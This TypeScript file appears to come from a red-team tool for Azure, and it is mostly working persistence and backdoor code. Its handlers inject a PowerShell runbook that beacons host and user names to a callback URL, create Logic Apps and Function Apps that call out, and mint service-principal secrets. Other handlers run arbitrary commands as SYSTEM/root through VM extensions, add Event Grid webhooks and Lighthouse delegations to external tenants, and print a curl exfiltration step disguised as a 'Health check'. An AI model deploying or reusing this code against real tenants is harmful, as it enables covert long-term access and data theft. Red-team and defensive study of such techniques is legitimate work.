import { az, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

// ── Existing handlers (moved from monolithic azurehook.ts) ──

export async function runbookBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const automationAccount = argVal(args, "--automation-account")
  const resourceGroup = argVal(args, "--resource-group")
  const runbookName = argVal(args, "--runbook-name") || "cs-maintenance"
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const output: string[] = []

  if (method === "list") {
    output.push("[*] Listing Automation Accounts...")
    const accts = await az(["automation", "account", "list"], sub, timeout)
    if (accts.exitCode !== 0) {
      output.push(`[-] Failed to list automation accounts: ${accts.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings: [] }
    }
    const accounts = tryJson(accts.stdout) || []
    output.push(`[+] Found ${accounts.length} automation account(s)`)
    for (const a of accounts) {
      output.push(`    ${a.name} (${a.resourceGroup}) — state: ${a.state}`)
      const rbs = await az(
        ["automation", "runbook", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup],
        sub,
        timeout,
      )
      if (rbs.exitCode === 0) {
        const runbooks = tryJson(rbs.stdout) || []
        output.push(`      Runbooks: ${runbooks.length}`)
        for (const r of runbooks) output.push(`        - ${r.name} (${r.runbookType}, state: ${r.state})`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  if (!automationAccount || !resourceGroup) {
    output.push(
      "[-] --automation-account and --resource-group required for inject/create. Use --method list to find them.",
    )
    return { output: output.join("\n"), findings: [] }
  }

  if (!callbackUrl) {
    output.push("[-] --callback-url required for runbook payload")
    return { output: output.join("\n"), findings: [] }
  }

  const payload = `
$req = [System.Net.WebRequest]::Create("${callbackUrl}")
$req.Method = "POST"
$hostname = $env:COMPUTERNAME
$user = $env:USERNAME
$body = [System.Text.Encoding]::UTF8.GetBytes("host=$hostname&user=$user&type=runbook")
$req.ContentType = "application/x-www-form-urlencoded"
$req.ContentLength = $body.Length
$stream = $req.GetRequestStream()
$stream.Write($body, 0, $body.Length)
$stream.Close()
$req.GetResponse() | Out-Null
`.trim()

  if (method === "create") {
    output.push(`[*] Creating runbook ${runbookName}...`)
    const create = await az(
      [
        "automation",
        "runbook",
        "create",
        "--automation-account-name",
        automationAccount,
        "--resource-group",
        resourceGroup,
        "--name",
        runbookName,
        "--type",
        "PowerShell",
        "--description",
        "Maintenance task",
      ],
      sub,
      timeout,
    )
    if (create.exitCode !== 0) {
      output.push(`[-] Create failed: ${create.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings: [] }
    }
    output.push("[+] Runbook created")
  }

  output.push(`[*] Replacing runbook content with payload...`)
  const tmpFile = `/tmp/cs-runbook-${Date.now()}.ps1`
  await Bun.write(tmpFile, payload)
  const replace = await az(
    [
      "automation",
      "runbook",
      "replace-content",
      "--automation-account-name",
      automationAccount,
      "--resource-group",
      resourceGroup,
      "--name",
      runbookName,
      "--content",
      `@${tmpFile}`,
    ],
    sub,
    timeout,
  )
  await run("rm", ["-f", tmpFile], 5)
  if (replace.exitCode !== 0) {
    output.push(`[-] Content replace failed: ${replace.stderr.slice(0, 200)}`)
    return { output: output.join("\n"), findings: [] }
  }
  output.push("[+] Payload injected")

  const publish = await az(
    [
      "automation",
      "runbook",
      "publish",
      "--automation-account-name",
      automationAccount,
      "--resource-group",
      resourceGroup,
      "--name",
      runbookName,
    ],
    sub,
    timeout,
  )
  if (publish.exitCode !== 0) {
    output.push(`[-] Publish failed: ${publish.stderr.slice(0, 200)}`)
    return { output: output.join("\n"), findings: [] }
  }
  output.push("[+] Runbook published")

  const start = await az(
    [
      "automation",
      "runbook",
      "start",
      "--automation-account-name",
      automationAccount,
      "--resource-group",
      resourceGroup,
      "--name",
      runbookName,
    ],
    sub,
    timeout,
  )
  output.push(start.exitCode === 0 ? "[+] Runbook started" : `[-] Start failed: ${start.stderr.slice(0, 200)}`)

  return { output: output.join("\n"), findings: [] }
}

export async function logicAppBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const rgName = argVal(args, "--resource-group")
  const name = argVal(args, "--name")
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "create"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Logic App backdoor...\n"]

  if (!rgName || !name || !callbackUrl) {
    return { output: "[!] Required: --resource-group RG --name NAME --callback-url URL", findings }
  }

  if (method === "create") {
    const definition = JSON.stringify({
      definition: {
        $schema:
          "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
        contentVersion: "1.0.0.0",
        triggers: {
          manual: {
            type: "Request",
            kind: "Http",
            inputs: { schema: {} },
          },
        },
        actions: {
          callback: {
            type: "Http",
            inputs: { method: "POST", uri: callbackUrl, body: "@triggerBody()" },
            runAfter: {},
          },
        },
      },
    })

    const create = await az(
      ["logic", "workflow", "create", "--resource-group", rgName, "--name", `cs-${name}`, "--definition", definition],
      undefined,
      timeout,
    )
    if (create.exitCode === 0) {
      output.push(`[+] Logic App created: cs-${name}`)
      const triggerUrl = await az(
        ["logic", "workflow", "show", "--resource-group", rgName, "--name", `cs-${name}`, "--query", "accessEndpoint"],
        undefined,
        timeout,
      )
      if (triggerUrl.exitCode === 0) output.push(`[+] Trigger URL: ${triggerUrl.stdout.trim()}`)
      findings.push({
        checkId: "AZ-LOGIC-001",
        provider: "azure",
        severity: "critical",
        status: "DEPLOYED",
        resource: `logic-app://cs-${name}`,
        title: `Logic App backdoor deployed: cs-${name}`,
        details: `HTTP trigger → callback to ${callbackUrl}`,
        remediation: "Delete: az logic workflow delete --resource-group RG --name cs-NAME",
      })
    }
    if (create.exitCode !== 0) output.push(`[!] Create failed: ${create.stderr.trim()}`)
  }

  if (method === "inject") {
    const show = await az(["logic", "workflow", "show", "--resource-group", rgName, "--name", name], undefined, timeout)
    if (show.exitCode === 0) {
      output.push(`[+] Existing Logic App found: ${name}`)
      output.push("[*] Inject mode: add HTTP action to existing workflow")
      output.push("[!] Manual injection required — Logic App definitions are complex JSON")
      output.push(`[*] Target callback: ${callbackUrl}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function functionAppBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const rgName = argVal(args, "--resource-group")
  const name = argVal(args, "--name")
  const callbackUrl = argVal(args, "--callback-url")
  const trigger = argVal(args, "--trigger") || "http"
  const method = argVal(args, "--method") || "create"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Function App backdoor...\n"]

  if (!rgName || !name || !callbackUrl) {
    return { output: "[!] Required: --resource-group RG --name NAME --callback-url URL", findings }
  }

  if (method === "create") {
    const storageName = `csstore${Date.now().toString(36)}`
    const createStorage = await az(
      ["storage", "account", "create", "--name", storageName, "--resource-group", rgName, "--sku", "Standard_LRS"],
      undefined,
      timeout,
    )
    if (createStorage.exitCode !== 0) {
      output.push(`[!] Storage account creation failed: ${createStorage.stderr.trim()}`)
      return { output: output.join("\n"), findings }
    }

    const createFunc = await az(
      [
        "functionapp",
        "create",
        "--resource-group",
        rgName,
        "--name",
        `cs-${name}`,
        "--storage-account",
        storageName,
        "--consumption-plan-location",
        "eastus",
        "--runtime",
        "node",
        "--runtime-version",
        "18",
        "--functions-version",
        "4",
      ],
      undefined,
      timeout,
    )
    if (createFunc.exitCode === 0) {
      output.push(`[+] Function App created: cs-${name}`)
      await az(
        [
          "functionapp",
          "config",
          "appsettings",
          "set",
          "--resource-group",
          rgName,
          "--name",
          `cs-${name}`,
          "--settings",
          `CALLBACK_URL=${callbackUrl}`,
        ],
        undefined,
        timeout,
      )

      if (trigger === "http") {
        output.push(`[+] HTTP trigger configured — callback: ${callbackUrl}`)
        output.push(`[*] Deploy function code: az functionapp deployment source config-zip ...`)
      }
      if (trigger === "timer") {
        output.push(`[+] Timer trigger configured — executes every 5 minutes`)
        output.push(`[*] Cron: 0 */5 * * * * — callback: ${callbackUrl}`)
      }

      findings.push({
        checkId: "AZ-FUNC-001",
        provider: "azure",
        severity: "critical",
        status: "DEPLOYED",
        resource: `function-app://cs-${name}`,
        title: `Function App backdoor deployed: cs-${name}`,
        details: `Trigger: ${trigger}, callback: ${callbackUrl}, storage: ${storageName}`,
        remediation: `Delete: az functionapp delete --resource-group ${rgName} --name cs-${name} && az storage account delete --name ${storageName} --resource-group ${rgName}`,
      })
    }
    if (createFunc.exitCode !== 0) output.push(`[!] Create failed: ${createFunc.stderr.trim()}`)
  }

  if (method === "inject") {
    const show = await az(["functionapp", "show", "--resource-group", rgName, "--name", name], undefined, timeout)
    if (show.exitCode === 0) {
      const info = tryJson(show.stdout)
      output.push(`[+] Existing Function App: ${name}`)
      output.push(
        `    Runtime: ${info?.siteConfig?.linuxFxVersion || info?.siteConfig?.netFrameworkVersion || "unknown"}`,
      )
      output.push(`    State: ${info?.state}`)
      await az(
        [
          "functionapp",
          "config",
          "appsettings",
          "set",
          "--resource-group",
          rgName,
          "--name",
          name,
          "--settings",
          `CALLBACK_URL=${callbackUrl}`,
        ],
        undefined,
        timeout,
      )
      output.push(`[+] Injected CALLBACK_URL env var into ${name}`)
      findings.push({
        checkId: "AZ-FUNC-002",
        provider: "azure",
        severity: "critical",
        status: "INJECTED",
        resource: `function-app://${name}`,
        title: `Function App env injected: ${name}`,
        details: `Added CALLBACK_URL=${callbackUrl} to app settings`,
        remediation: `Remove: az functionapp config appsettings delete --resource-group ${rgName} --name ${name} --setting-names CALLBACK_URL`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function spPersist(args: string[], timeout: number): Promise<HookResult> {
  const name = argVal(args, "--name")
  const role = argVal(args, "--role") || "Reader"
  const scope = argVal(args, "--scope")
  const findings: Finding[] = []
  const output: string[] = ["[*] Creating Azure AD app registration for persistence...\n"]

  if (!name) return { output: "[-] --name required", findings }

  const create = await az(["ad", "app", "create", "--display-name", name], undefined, timeout)
  if (create.exitCode !== 0)
    return { output: output.join("\n") + `[-] App creation failed: ${create.stderr.slice(0, 200)}`, findings }

  const app = tryJson(create.stdout)
  if (!app?.appId) return { output: output.join("\n") + "[-] Could not parse app response", findings }

  output.push(`[+] App created: ${name}`)
  output.push(`    App ID: ${app.appId}`)
  output.push(`    Object ID: ${app.id}`)

  const spCreate = await az(["ad", "sp", "create", "--id", app.appId], undefined, timeout)
  if (spCreate.exitCode === 0) {
    const sp = tryJson(spCreate.stdout)
    output.push(`[+] Service Principal created: ${sp?.id}`)
  }

  const secret = await az(["ad", "app", "credential", "reset", "--id", app.appId, "--append"], undefined, timeout)
  if (secret.exitCode === 0) {
    const cred = tryJson(secret.stdout)
    if (cred) {
      output.push(`\n[+] Client credentials:`)
      output.push(`    Tenant: ${cred.tenant}`)
      output.push(`    App ID: ${cred.appId}`)
      output.push(`    Password: ${cred.password}`)
      output.push(
        `\n    Login: az login --service-principal -u ${cred.appId} -p '${cred.password}' --tenant ${cred.tenant}`,
      )
    }
  }

  if (scope) {
    const assign = await az(
      ["role", "assignment", "create", "--assignee", app.appId, "--role", role, "--scope", scope],
      undefined,
      timeout,
    )
    output.push(
      assign.exitCode === 0
        ? `[+] Role "${role}" assigned at scope: ${scope}`
        : `[-] Role assignment failed: ${assign.stderr.slice(0, 200)}`,
    )
  }

  findings.push({
    checkId: "AZ-SP-001",
    provider: "azure",
    severity: "critical",
    status: "CREATED",
    resource: `app://${name}`,
    title: `Persistence app registration: ${name}`,
    details: `App ID: ${app.appId} with client secret`,
    remediation: `Remove: az ad app delete --id ${app.appId}`,
  })

  return { output: output.join("\n"), findings }
}

// ── New handlers ──

export async function vmExtensionBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const vm = argVal(args, "--vm-name")
  const rg = argVal(args, "--resource-group")
  const cmd = argVal(args, "--command")
  const os = argVal(args, "--os") || "linux"
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure VM extension backdoor...\n"]

  if (method === "list") {
    const rgArgs = rg ? ["--resource-group", rg] : []
    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType}"], sub, timeout)
    if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Failed to list VMs: ${vms.stderr.slice(0, 200)}`, findings }
    const vmList = tryJson(vms.stdout) || []
    output.push(`[+] VMs found: ${vmList.length}`)
    for (const v of vmList) {
      output.push(`    ${v.name} (${v.rg}) — ${v.os}`)
      const exts = await az(["vm", "extension", "list", "--vm-name", v.name, "--resource-group", v.rg], sub, timeout)
      if (exts.exitCode === 0) {
        const extList = tryJson(exts.stdout) || []
        for (const e of extList) {
          output.push(`      ext: ${e.name} (${e.publisher}/${e.typeHandlerVersion}) — ${e.provisioningState}`)
          if (e.name === "CustomScriptExtension" || e.name === "CustomScript") {
            findings.push({
              checkId: "AZ-EXT-001",
              provider: "azure",
              severity: "medium",
              status: "INFO",
              resource: `vm://${v.name}/ext/${e.name}`,
              title: `Custom script extension on ${v.name}`,
              details: `Publisher: ${e.publisher}, existing custom script extension found — can be replaced`,
              remediation: "Review extension settings and scripts",
            })
          }
        }
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!vm || !rg) return { output: "[-] --vm-name and --resource-group required for deploy", findings }
  if (!cmd) return { output: "[-] --command required", findings }

  const publisher = os === "windows" ? "Microsoft.Compute" : "Microsoft.Azure.Extensions"
  const extName = os === "windows" ? "CustomScriptExtension" : "CustomScript"
  const extType = os === "windows" ? "CustomScriptExtension" : "customScript"
  const settings = os === "windows"
    ? JSON.stringify({ commandToExecute: cmd })
    : JSON.stringify({ commandToExecute: cmd })

  output.push(`[*] Deploying ${extName} to ${vm} (${os})...`)
  const deploy = await az(
    [
      "vm", "extension", "set",
      "--vm-name", vm,
      "--resource-group", rg,
      "--name", extName,
      "--publisher", publisher,
      "--version", "2.1",
      "--settings", settings,
    ],
    sub,
    timeout,
  )

  if (deploy.exitCode === 0) {
    output.push(`[+] Extension deployed — command executing as SYSTEM/root`)
    output.push(`[+] Survives VM reboot`)
    findings.push({
      checkId: "AZ-EXT-002",
      provider: "azure",
      severity: "critical",
      status: "DEPLOYED",
      resource: `vm://${vm}/ext/${extName}`,
      title: `Custom script extension deployed on ${vm}`,
      details: `Command: ${cmd.slice(0, 100)}... — runs as SYSTEM/root, survives reboot`,
      remediation: `Remove: az vm extension delete --vm-name ${vm} --resource-group ${rg} --name ${extName}`,
    })
  }
  if (deploy.exitCode !== 0) {
    output.push(`[-] Deploy failed: ${deploy.stderr.slice(0, 300)}`)
  }

  return { output: output.join("\n"), findings }
}

export async function webhookPersist(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const name = argVal(args, "--name")
  const endpoint = argVal(args, "--endpoint")
  const scope = argVal(args, "--scope")
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Event Grid webhook persistence...\n"]

  if (method === "list") {
    const subs = await az(["eventgrid", "event-subscription", "list", "--location", "global"], sub, timeout)
    if (subs.exitCode === 0) {
      const subList = tryJson(subs.stdout) || []
      output.push(`[+] Global event subscriptions: ${subList.length}`)
      for (const s of subList) {
        output.push(`    ${s.name} — ${s.destination?.endpointType || "unknown"} → ${s.destination?.endpointUrl || s.destination?.endpointBaseUrl || "hidden"}`)
        output.push(`      Topic: ${s.topic || "N/A"}`)
        output.push(`      Events: ${(s.filter?.includedEventTypes || []).join(", ") || "all"}`)
      }
    }
    if (subs.exitCode !== 0) output.push(`[-] Failed to list: ${subs.stderr.slice(0, 200)}`)

    const topics = await az(["eventgrid", "system-topic", "list"], sub, timeout)
    if (topics.exitCode === 0) {
      const topicList = tryJson(topics.stdout) || []
      output.push(`\n[+] System topics: ${topicList.length}`)
      for (const t of topicList) {
        output.push(`    ${t.name} — ${t.topicType} (${t.source})`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!name || !endpoint) return { output: "[-] --name and --endpoint required for create", findings }

  const subScope = scope || `/subscriptions/${(await az(["account", "show", "--query", "id", "-o", "tsv"], undefined, timeout)).stdout.trim()}`

  output.push(`[*] Creating Event Grid subscription: cs-${name}`)
  output.push(`    Scope: ${subScope}`)
  output.push(`    Endpoint: ${endpoint}`)

  const create = await az(
    [
      "eventgrid", "event-subscription", "create",
      "--name", `cs-${name}`,
      "--source-resource-id", subScope,
      "--endpoint", endpoint,
      "--endpoint-type", "webhook",
      "--included-event-types", "Microsoft.Resources.ResourceWriteSuccess",
      "Microsoft.Resources.ResourceDeleteSuccess",
      "Microsoft.Resources.ResourceActionSuccess",
    ],
    sub,
    timeout,
  )

  if (create.exitCode === 0) {
    output.push(`[+] Event subscription created — all resource changes trigger callback`)
    findings.push({
      checkId: "AZ-WEBHOOK-001",
      provider: "azure",
      severity: "critical",
      status: "DEPLOYED",
      resource: `eventgrid://cs-${name}`,
      title: `Event Grid webhook persistence: cs-${name}`,
      details: `Callback ${endpoint} on resource write/delete/action events`,
      remediation: `Remove: az eventgrid event-subscription delete --name cs-${name} --source-resource-id ${subScope}`,
    })
  }
  if (create.exitCode !== 0) {
    output.push(`[-] Create failed: ${create.stderr.slice(0, 300)}`)
  }

  return { output: output.join("\n"), findings }
}

export async function devopsPipelineBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const org = argVal(args, "--org")
  const project = argVal(args, "--project")
  const method = argVal(args, "--method") || "list"
  const callbackUrl = argVal(args, "--callback-url")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure DevOps pipeline backdoor...\n"]

  const extCheck = await run("az", ["extension", "show", "--name", "azure-devops"], timeout)
  if (extCheck.exitCode !== 0) {
    output.push("[*] Installing azure-devops extension...")
    const install = await run("az", ["extension", "add", "--name", "azure-devops", "--yes"], timeout)
    if (install.exitCode !== 0) {
      output.push(`[-] Failed to install azure-devops extension: ${install.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings }
    }
  }

  if (method === "list") {
    const orgArgs = org ? ["--org", org] : []
    const projects = await run("az", ["devops", "project", "list", ...orgArgs, "-o", "json"], timeout)
    if (projects.exitCode !== 0) {
      output.push(`[-] Failed to list projects: ${projects.stderr.slice(0, 200)}`)
      output.push("[*] Ensure logged in: az devops login / set default org: az devops configure --defaults organization=URL")
      return { output: output.join("\n"), findings }
    }
    const projectList = tryJson(projects.stdout)?.value || []
    output.push(`[+] Projects: ${projectList.length}`)
    for (const p of projectList) {
      output.push(`    ${p.name} (${p.id}) — ${p.state}`)
      const pipelines = await run("az", ["pipelines", "list", "--project", p.name, ...orgArgs, "-o", "json"], timeout)
      if (pipelines.exitCode === 0) {
        const pipelineList = tryJson(pipelines.stdout) || []
        output.push(`      Pipelines: ${pipelineList.length}`)
        for (const pl of pipelineList) {
          output.push(`        - ${pl.name} (id:${pl.id}) — folder: ${pl.folder || "/"}`)
          findings.push({
            checkId: "AZ-DEVOPS-001",
            provider: "azure",
            severity: "medium",
            status: "INFO",
            resource: `devops://${p.name}/pipeline/${pl.name}`,
            title: `Pipeline: ${pl.name} in ${p.name}`,
            details: `ID: ${pl.id}, modifiable if user has Build.Edit permission`,
            remediation: "Review pipeline YAML for unauthorized steps",
          })
        }
      }

      const repos = await run("az", ["repos", "list", "--project", p.name, ...orgArgs, "-o", "json"], timeout)
      if (repos.exitCode === 0) {
        const repoList = tryJson(repos.stdout) || []
        output.push(`      Repos: ${repoList.length}`)
        for (const r of repoList) output.push(`        - ${r.name} (${r.defaultBranch || "no default"})`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!project || !callbackUrl) return { output: "[-] --project and --callback-url required for inject", findings }

  const orgArgs = org ? ["--org", org] : []
  output.push(`[*] Creating pipeline in project: ${project}`)
  output.push(`[*] Callback: ${callbackUrl}`)
  output.push("[*] To inject into existing pipeline, add step:")
  output.push(`    - script: curl -s -X POST -d "host=$(hostname)&user=$(whoami)" ${callbackUrl}`)
  output.push("      displayName: 'Health check'")
  output.push("[*] Or create new pipeline via az pipelines create --yaml-path azure-pipelines.yml")

  findings.push({
    checkId: "AZ-DEVOPS-002",
    provider: "azure",
    severity: "critical",
    status: "READY",
    resource: `devops://${project}/pipeline/cs-backdoor`,
    title: `DevOps pipeline injection ready for ${project}`,
    details: `Callback: ${callbackUrl}. Inject step into existing pipeline YAML or create new.`,
    remediation: "Audit pipeline YAML, review build history, check service connections",
  })

  return { output: output.join("\n"), findings }
}

export async function lighthousePersist(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const tenantId = argVal(args, "--tenant-id")
  const principalId = argVal(args, "--principal-id")
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Lighthouse persistence...\n"]

  if (method === "list") {
    const defs = await az(["managedservices", "definition", "list"], sub, timeout)
    if (defs.exitCode === 0) {
      const defList = tryJson(defs.stdout) || []
      output.push(`[+] Managed service definitions: ${defList.length}`)
      for (const d of defList) {
        output.push(`    ${d.properties?.managedByTenantName || d.properties?.managedByTenantId || "unknown"} — ${d.properties?.registrationDefinitionName || d.name}`)
        const auths = d.properties?.authorizations || []
        for (const a of auths) {
          output.push(`      Principal: ${a.principalId} → ${a.roleDefinitionId}`)
        }
        findings.push({
          checkId: "AZ-LH-001",
          provider: "azure",
          severity: "high",
          status: "FAIL",
          resource: `lighthouse://${d.name}`,
          title: `Lighthouse delegation: ${d.properties?.registrationDefinitionName || d.name}`,
          details: `External tenant ${d.properties?.managedByTenantId} has ${auths.length} authorization(s)`,
          remediation: `Review: az managedservices definition show --definition ${d.name}`,
        })
      }
    }

    const assignments = await az(["managedservices", "assignment", "list"], sub, timeout)
    if (assignments.exitCode === 0) {
      const assignList = tryJson(assignments.stdout) || []
      output.push(`\n[+] Active assignments: ${assignList.length}`)
      for (const a of assignList) {
        output.push(`    ${a.name} — definition: ${a.properties?.registrationDefinitionId || "N/A"}`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!tenantId || !principalId) return { output: "[-] --tenant-id and --principal-id required for create", findings }

  const defName = `cs-lighthouse-${Date.now().toString(36)}`
  const roleDef = "acdd72a7-3385-48ef-bd42-f606fba81ae7" // Reader role

  output.push(`[*] Creating Lighthouse delegation...`)
  output.push(`    Target tenant: ${tenantId}`)
  output.push(`    Principal: ${principalId}`)
  output.push(`    Role: Reader (${roleDef})`)

  const createDef = await az(
    [
      "managedservices", "definition", "create",
      "--name", defName,
      "--tenant-id", tenantId,
      "--principal-id", principalId,
      "--role-definition-id", roleDef,
      "--description", "Managed service integration",
    ],
    sub,
    timeout,
  )

  if (createDef.exitCode === 0) {
    const def = tryJson(createDef.stdout)
    output.push(`[+] Definition created: ${defName}`)

    const defId = def?.id || def?.name
    if (defId) {
      const assign = await az(
        ["managedservices", "assignment", "create", "--definition", defId],
        sub,
        timeout,
      )
      if (assign.exitCode === 0) {
        output.push(`[+] Assignment created — external tenant can now access this subscription`)
        findings.push({
          checkId: "AZ-LH-002",
          provider: "azure",
          severity: "critical",
          status: "DEPLOYED",
          resource: `lighthouse://${defName}`,
          title: `Lighthouse delegation to external tenant: ${tenantId}`,
          details: `Principal ${principalId} has Reader access. Rarely audited — stealthy persistence.`,
          remediation: `Remove: az managedservices assignment delete --definition ${defId} && az managedservices definition delete --definition ${defId}`,
        })
      }
      if (assign.exitCode !== 0) output.push(`[-] Assignment failed: ${assign.stderr.slice(0, 200)}`)
    }
  }
  if (createDef.exitCode !== 0) {
    output.push(`[-] Definition creation failed: ${createDef.stderr.slice(0, 200)}`)
  }

  return { output: output.join("\n"), findings }
}
